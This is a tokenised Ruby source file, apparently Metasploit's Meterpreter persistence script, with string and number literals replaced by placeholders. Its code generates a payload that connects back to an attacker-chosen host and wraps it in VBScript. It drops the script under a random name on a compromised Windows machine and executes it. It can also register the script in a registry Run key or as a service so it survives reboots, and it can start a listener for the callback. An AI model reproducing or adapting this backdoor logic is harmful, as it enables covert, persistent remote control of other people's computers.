@client = client key = <str> rhost = Rex :: Socket . source_address ( <str> ) rport = <int> delay = <int> install = false autoconn = false serv = false altexe = nil target_dir = nil payload_type = <str> script = nil script_on_target = nil @exec_opts = Rex :: Parser :: Arguments . new ( <str> = > [ false , <str> ] , <str> = > [ true , <str> ] , <str> = > [ true , <str> ] , <str> = > [ true , <str> ] , <str> = > [ false , <str> ] , <str> = > [ false , <str> ] , <str> = > [ false , <str> ] , <str> = > [ false , <str> ] , <str> = > [ true , <str> ] , <str> = > [ true , <str> ] , <str> = > [ true , <str> ] ) meter_type = client . platform def usage print_line <str> print_line ( @exec_opts . usage ) raise Rex :: Script :: Completed end def wrong_meter_version ( meter = meter_type ) print_error ( <str> meter <str> ) raise Rex :: Script :: Completed end def create_payload ( payload_type , lhost , lport ) print_status ( <str> payload_type <str> lhost <str> lport <str> ) payload = payload_type pay = client . framework . payloads . create ( payload ) pay . datastore [ <str> ] = lhost pay . datastore [ <str> ] = lport return pay . generate end def create_script ( delay , altexe , raw , is_x64 ) if is_x64 if altexe vbs = :: Msf :: Util :: EXE . to_win64pe_vbs ( @client . framework , raw , { <str> = > true , <str> = > delay , <str> = > altexe } ) else vbs = :: Msf :: Util :: EXE . to_win64pe_vbs ( @client . framework , raw , { <str> = > true , <str> = > delay } ) end else if altexe vbs = :: Msf :: Util :: EXE . to_win32pe_vbs ( @client . framework , raw , { <str> = > true , <str> = > delay , <str> = > altexe } ) else vbs = :: Msf :: Util :: EXE . to_win32pe_vbs ( @client . framework , raw , { <str> = > true , <str> = > delay } ) end end print_status ( <str> vbs . length <str> ) return vbs end def log_file ( log_path = nil ) host = @client . sys . config . sysinfo [ <str> ] filenameinfo = <str> + :: Time . now . strftime ( <str> ) if log_path logs = :: File . join ( log_path , <str> , <str> , Rex :: FileUtils . clean_path ( host + filenameinfo ) ) else logs = :: File . join ( Msf :: Config . log_directory , <str> , Rex :: FileUtils . clean_path ( host + filenameinfo ) ) end :: FileUtils . mkdir_p ( logs ) logfile = logs + :: File :: Separator + Rex :: FileUtils . clean_path ( host + filenameinfo ) + <str> return logfile end def write_script_to_target ( target_dir , vbs ) if target_dir tempdir = target_dir else tempdir = @client . fs . file . expand_path ( <str> ) end tempvbs = tempdir + <str> + Rex :: Text . rand_text_alpha ( ( rand ( <int> ) + <int> ) ) + <str> fd = @client . fs . file . new ( tempvbs , <str> ) fd . write ( vbs ) fd . close print_good ( <str> tempvbs <str> ) file_local_write ( @clean_up_rc , <str> tempvbs . gsub ( <str> , <str> ) <str> ) return tempvbs end def set_handler ( selected_payload , rhost , rport ) print_status ( <str> rport <str> selected_payload <str> ) mul = client . framework . exploits . create ( <str> ) mul . datastore [ <str> ] = @client . workspace mul . datastore [ <str> ] = selected_payload mul . datastore [ <str> ] = rhost mul . datastore [ <str> ] = rport mul . datastore [ <str> ] = <str> mul . datastore [ <str> ] = false mul . exploit_simple ( <str> = > mul . datastore [ <str> ] , <str> = > true ) print_good ( <str> ) end def targets_exec ( script_on_target ) print_status ( <str> script_on_target <str> ) proc = session . sys . process . execute ( <str> script_on_target <str> , nil , { <str> = > true } ) print_good ( <str> proc . pid <str> ) return proc . pid end def write_to_reg ( key , script_on_target ) nam = Rex :: Text . rand_text_alpha ( rand ( <int> ) + <int> ) key_path = <str> key <str> print_status ( <str> key_path <str> nam <str> ) if key registry_setvaldata ( <str> key_path <str> , nam , script_on_target , <str> ) print_good ( <str> key_path <str> nam <str> ) file_local_write ( @clean_up_rc , <str> key_path <str> nam <str> ) else print_error ( <str> ) end end def install_as_service ( script_on_target ) if not is_uac_enabled? or is_admin? print_status ( <str> ) nam = Rex :: Text . rand_text_alpha ( rand ( <int> ) + <int> ) print_status ( <str> nam <str> ) service_create ( nam , nam , <str> script_on_target <str> ) file_local_write ( @clean_up_rc , <str> nam <str> ) else print_error ( <str> ) end end @exec_opts . parse ( args ) { | opt , idx , val | case opt when <str> usage when <str> rhost = val when <str> rport = val . to_i when <str> delay = val . to_i when <str> install = true key = <str> when <str> serv = true when <str> install = true key = <str> when <str> autoconn = true when <str> target_dir = val when <str> altexe = val when <str> payload_type = val end } wrong_meter_version ( meter_type ) if meter_type !~ <str> print_status ( <str> ) @clean_up_rc = log_file ( ) print_status ( <str> @clean_up_rc <str> ) raw = create_payload ( payload_type , rhost , rport ) script = create_script ( delay , altexe , raw , payload_type . include? ( <str> ) ) script_on_target = write_script_to_target ( target_dir , script ) if autoconn set_handler ( payload_type , rhost , rport ) end targets_exec ( script_on_target ) if install write_to_reg ( key , script_on_target ) end if serv install_as_service ( script_on_target ) end 
